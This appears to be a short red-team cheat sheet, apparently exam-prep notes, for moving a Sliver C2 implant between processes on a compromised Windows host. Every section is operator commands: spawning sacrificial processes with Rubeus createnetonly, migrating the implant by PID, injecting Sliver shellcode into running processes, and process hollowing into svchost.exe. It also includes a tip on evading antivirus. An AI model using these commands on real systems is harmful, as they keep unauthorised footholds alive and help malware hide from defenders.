# Implant Duplication and Migration

### 1) Launch either x64 or x86 version of notepad according to beacon process

    execute C:\\windows\\system32\\notepad.exe
    execute -T notepad
    execute C:\\windows\\SysWOW64\\notepad.exe

### 2) Launching process with Rubeus

    rubeus -t 20 -- createnetonly /program:C:\\windows\\SysWOW64\\notepad.exe
    rubeus -t 20 -- createnetonly /program:C:\\windows\\system32\\cmd.exe

### 3) Get process pid (usually last process)

    ps -e notepad

### 4) Get explorer's pid for stability

    ps -e explorer

### 5) Migrate into the created process (two ways, migrate or execute-shellcode)

    migrate -p 3532

#### TIP: Works best on x86 with AV

### 6) x64 - ShikataGaNai

    execute-shellcode -p 5544 /home/kali/OSEP/hav0c/sliver.x64.bin
    execute-shellcode -S -r -I 10 -p 9088 /home/kali/OSEP/hav0c/sliver.x64.bin

### 7) Process hollowing (recommended)

    hollow svchost.exe /home/kali/OSEP/hav0c/sliver.x64.bin

### 8) x86 - Using -A or without, makes no difference, sliver automatically detects the arch for 32 bit

    execute-shellcode -A 386 -p 1524 /home/kali/OSEP/hav0c/sliver.x86.bin
    execute-shellcode -p 6896 /home/kali/OSEP/hav0c/sliver.x86.bin
